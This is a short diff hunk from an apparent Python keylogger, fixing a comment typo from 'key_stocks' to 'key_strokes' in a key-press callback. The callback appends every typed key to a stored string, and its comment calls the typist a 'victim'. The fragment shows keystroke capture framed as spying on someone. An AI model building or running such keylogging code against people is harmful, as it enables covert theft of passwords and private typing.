@@ -4,7 +4,7 @@ def key_press(key):
     global stored_key
     try:
       stored_key=stored_key + str(key.char)
-      print(stored_key) #display victim key_stocks
+      print(stored_key) #display victim key_strokes
     except AttributeError:
         if key==key.space or key.backspace:
           stored_key=stored_key+" "
